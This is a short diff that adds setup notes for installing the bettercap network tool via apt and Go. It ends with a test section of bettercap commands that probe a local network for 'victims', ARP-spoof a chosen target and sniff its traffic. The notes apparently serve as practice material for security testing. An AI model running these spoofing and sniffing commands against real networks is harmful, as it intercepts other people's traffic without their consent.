@@ -1,0 +1,50 @@
+#How to install bettercap
+
+#Updating your machine
+sudo apt update && sudo apt full-upgrade -y
+
+#Checking if Go is installed
+go version
+
+#If Go is version 1.19 or lower, time for an update
+sudo apt remove golang-go -y
+sudo apt install golang-go -y
+
+#If you never had go before, Install go
+sudo apt install golang-go -y
+
+#Installing prerequisites
+sudo apt install -y build-essential pkg-config libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
+
+#Installing Bettercap using Go
+go install github.com/bettercap/bettercap@latest
+
+#Put it on path
+sudo mv ~/go/bin/bettercap /usr/local/bin/
+
+#Verify installation
+bettercap -h
+
+#Install additional modules (caplets & web assets)
+sudo mkdir -p /usr/local/share/bettercap
+cd /usr/local/share/bettercap
+sudo git clone https://github.com/bettercap/caplets
+
+===========================================
+
+#TESTING IT BY SNIFFING NETWORK TRAFFIC
+
+#Find out which interface you are using
+ip a
+
+#Start Bettercap
+bettercap -iface eth0
+
+#Find devices (victims)
+net.probe on
+net.show
+
+#Arp Spoof Attack
+set arp.spoof.targets ip.of.vic.tim
+arp.spoof on
+net.sniff on
